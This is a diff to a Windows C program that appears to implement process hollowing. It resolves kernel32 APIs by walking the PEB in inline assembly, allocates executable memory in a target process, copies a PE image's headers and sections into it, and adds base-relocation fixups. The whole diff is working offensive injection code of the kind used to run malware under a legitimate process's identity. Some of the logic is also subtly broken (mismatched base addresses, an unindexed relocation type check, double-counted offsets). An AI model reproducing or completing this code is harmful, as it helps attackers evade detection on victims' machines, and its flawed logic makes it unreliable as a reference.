@@ -1,9 +1,19 @@
 #include <windows.h>
 #include <stdio.h>
-#include "Hollow.h"
 #include <subauth.h>
 
 #define DEBUG 
+
+
+typedef struct BASE_RELOCATION_BLOCK {
+	DWORD PageAddress;
+	DWORD BlockSize;
+} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;
+
+typedef struct BASE_RELOCATION_ENTRY {
+	USHORT Offset : 12;
+	USHORT Type : 4;
+} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
 
 typedef struct _RTL_USER_PROCESS_PARAMETERS {
 	BYTE           Reserved1[16];
@@ -78,7 +88,6 @@ DWORD GetProcessHeapo()
 void Kernel32_NTdll_bases()
 {
 	__asm {
-		
 		xor eax , eax
 		mov eax , fs:[eax + 0x30] //PEB
 		mov eax , [eax+0xc] // pointer LDR 
@@ -89,7 +98,6 @@ void Kernel32_NTdll_bases()
 		mov eax , [eax] // kernel32.dll
 		mov ecx , [eax+0x10]
 		mov [kernel32_base] , ecx // image base of kernel32.dll
-		
 	}
 
 }
@@ -190,7 +198,7 @@ int wmain()
 	
 	/*source file*/
 	_CreateFileA Createfil = find_function_address(kernel32_base,"CreateFileA");
-	HANDLE src = Createfil("C:\\Users\\Slashroot\\Desktop\\PECmd.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
+	HANDLE src = Createfil("C:\\Windows\\SysWow64\\cmd.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
 	if (src==0xFFFFFFFF) {
 #ifdef DEBUG
 		printf("can't open file . bye !"); 
@@ -233,7 +241,9 @@ int wmain()
 	If the address in within an enclave that you initialized, then the allocation operation fails with the ERROR_INVALID_ADDRESS error.
 	*/
 	_VirtualAllocEx VirtualAll = find_function_address(kernel32_base, "VirtualAllocEx");
+#ifdef DEBUG
 	printf("[+] targetimagebase is = %x\n",(DWORD)TargetImageBase);
+#endif	
 	LPVOID DstImgBase = VirtualAll(target, NULL, srcImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (!DstImgBase) {
 #ifdef DEBUG
@@ -245,7 +255,7 @@ int wmain()
 	DWORD Diff = (DWORD)DstImgBase - srcNtHeaders->OptionalHeader.ImageBase; 
 
 #ifdef DEBUG 
-	printf("[+] log about Imagebase:\n\tPrefered Source image = 0x%x\n\tMemory on destination allocated at = 0x%x\n\tDifference = 0x%x", srcNtHeaders->OptionalHeader.ImageBase, (DWORD)DstImgBase,Diff);
+	printf("[+] log about Imagebase:\n\tPrefered Source image = 0x%x\n\tMemory on destination allocated at = 0x%x\n\tDifference = 0x%x\n", srcNtHeaders->OptionalHeader.ImageBase, (DWORD)DstImgBase,Diff);
 #endif
 	
 	/*copying headers*/
@@ -257,7 +267,56 @@ int wmain()
 
 	/*copying sections*/
 	for (BYTE Section = 0; Section < srcNtHeaders->FileHeader.NumberOfSections; Section++,srcImageSection++)
-		WriteProcessMemory(target, (PVOID)((DWORD)TargetImageBase + srcImageSection->VirtualAddress), (PVOID)((DWORD)srcBuffer + srcImageSection->PointerToRawData), srcImageSection->SizeOfRawData, NULL);
+		WriteProcessMem(target, (PVOID)((DWORD)TargetImageBase + srcImageSection->VirtualAddress), (PVOID)((BYTE*)srcBuffer + srcImageSection->PointerToRawData), srcImageSection->SizeOfRawData, NULL);
+#ifdef DEBUG
+	printf("[+] Sections Copied successfully\n");
+#endif
 
-	return 0x1;
+	/* Relocations */
+	/* 
+	reloc is the last section on the binary statiscly speaking (statement to confirm) , of course theoretically it can be otherwise with some custom compiler options 
+	in this implementation I'am assumuing that hypothesis since I have control on the PE that I'll inject .
+	*/
+	/*
+	from the loop before , our section variable points to .reloc section
+	*/
+	DWORD relocAddress = srcImageSection->PointerToRawData;
+	IMAGE_DATA_DIRECTORY relocData = srcNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+	DWORD offset_block = 0;
+#ifdef DEBUG
+	printf("[+] Relocation log : \n");
+#endif
+	while (offset_block < relocData.Size) /*iterating over HeaderBlocks*/
+	{
+		PBASE_RELOCATION_BLOCK Blockheader = (PBASE_RELOCATION_BLOCK)((BYTE*)srcBuffer+relocAddress + offset_block);
+		offset_block += sizeof(BASE_RELOCATION_BLOCK);
+		DWORD N_Entries = (Blockheader->BlockSize - sizeof(BASE_RELOCATION_BLOCK))/sizeof(BASE_RELOCATION_ENTRY);
+		printf("entries = %x", N_Entries); 
+		 
+		PBASE_RELOCATION_ENTRY First_Block = (PBASE_RELOCATION_ENTRY)((BYTE*)srcBuffer + relocAddress + offset_block);
+
+		for (DWORD X = 0; X < N_Entries; X++) /*iterating over entries*/
+		{
+
+			offset_block += sizeof(BASE_RELOCATION_ENTRY);
+			if (First_Block->Type)
+			{
+				DWORD value; 
+				ReadProcessMem(target, (BYTE*)TargetImageBase + Blockheader->PageAddress + First_Block[X].Offset, &value, sizeof(value), NULL); 
+				value += Diff;
+#ifdef DEBUG
+				printf("\tRelocating Address %x -> %x\n",value-Diff,value);
+#endif
+				if (!WriteProcessMem(target, (BYTE*)TargetImageBase + Blockheader->PageAddress + First_Block[X].Offset, &value, sizeof(value), NULL))
+				{
+					printf("[-] error error error");
+					return 0xDEADBEEF; 
+				};
+
+			}
+		}
+
+
+	}
+
 }
